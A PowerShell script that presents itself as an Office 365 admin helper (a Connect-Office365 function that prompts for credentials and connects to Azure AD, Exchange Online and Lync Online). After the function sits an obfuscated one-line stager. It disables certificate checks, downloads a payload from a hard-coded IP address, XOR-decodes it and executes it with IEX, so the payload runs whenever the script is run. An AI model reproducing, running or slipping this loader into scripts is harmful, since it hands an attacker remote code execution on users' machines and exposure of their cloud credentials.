function Connect-Office365
{

	[CmdletBinding()]
	PARAM ()
	BEGIN
	{
		TRY
		{
			
			IF (-not (Get-Module -Name MSOnline -ListAvailable))
			{
				Write-Verbose -Message "BEGIN - Import module Azure Active Directory"
				Import-Module -Name MSOnline -ErrorAction Stop -ErrorVariable ErrorBeginIpmoMSOnline
			}

			IF (-not (Get-Module -Name LyncOnlineConnector -ListAvailable))
			{
				Write-Verbose -Message "BEGIN - Import module Lync Online"
				Import-Module -Name LyncOnlineConnector -ErrorAction Stop -ErrorVariable ErrorBeginIpmoLyncOnline
			}
		}
		CATCH
		{
			Write-Warning -Message "BEGIN - Something went wrong!"
			IF ($ErrorBeginIpmoMSOnline)
			{
				Write-Warning -Message "BEGIN - Error while importing MSOnline module"
			}
			IF ($ErrorBeginIpmoLyncOnline)
			{
				Write-Warning -Message "BEGIN - Error while importing LyncOnlineConnector module"
			}

			Write-Warning -Message $error[0].exception.message
		}
	}
	PROCESS
	{
		TRY
		{

			
			Write-Verbose -Message "PROCESS - Ask for Office365 Credential"
			$O365cred = Get-Credential -ErrorAction Stop -ErrorVariable ErrorCredential

			
			Write-Verbose -Message "PROCESS - Connect to Azure Active Directory"
			Connect-MsolService -Credential $O365cred -ErrorAction Stop -ErrorVariable ErrorConnectMSOL

			
			Write-Verbose -Message "PROCESS - Create session to Exchange online"
			$ExchangeURL = "https://ps.outlook.com/powershell/"
			$O365PS = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ExchangeURL -Credential $O365cred -Authentication Basic -AllowRedirection -ErrorAction Stop -ErrorVariable ErrorConnectExchange

			Write-Verbose -Message "PROCESS - Open session to Exchange online (Prefix: Cloud)"
			Import-PSSession -Session $O365PS –Prefix ExchCloud

			
			Write-Verbose -Message "PROCESS - Create session to Lync online"
			$lyncsession = New-CsOnlineSession –Credential $O365cred -ErrorAction Stop -ErrorVariable ErrorConnectExchange
			Import-PSSession -Session $lyncsession -Prefix LyncCloud

			
			
		}
		CATCH
		{
			Write-Warning -Message "PROCESS - Something went wrong!"
			IF ($ErrorCredential)
			{
				Write-Warning -Message "PROCESS - Error while gathering credential"
			}
			IF ($ErrorConnectMSOL)
			{
				Write-Warning -Message "PROCESS - Error while connecting to Azure AD"
			}
			IF ($ErrorConnectExchange)
			{
				Write-Warning -Message "PROCESS - Error while connecting to Exchange Online"
			}
			IF ($ErrorConnectLync)
			{
				Write-Warning -Message "PROCESS - Error while connecting to Lync Online"
			}

			Write-Warning -Message $error[0].exception.message
		}
	}
}
$WC=NEW-OBjECT SySteM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEaDeRs.Add('User-Agent',$u);$Wc.ProxY = [SYstem.Net.WEbREqUESt]::DefaUlTWeBPrOXy;$wc.PRoxy.CRedeNtiAls = [SySteM.NET.CReDEntiALCaChe]::DEFaULTNETwoRkCREDEnTiaLS;$K='0qoga`PzyB\pse]{_iO.G*Dd>uN=x?:S';$i=0;[CHAr[]]$B=([ChAR[]]($wc.DownloaDStrInG("https://46.101.90.248:443/index.asp")))|%{$_-BXOr$k[$I++%$K.LengTh]};IEX ($b-joiN'')

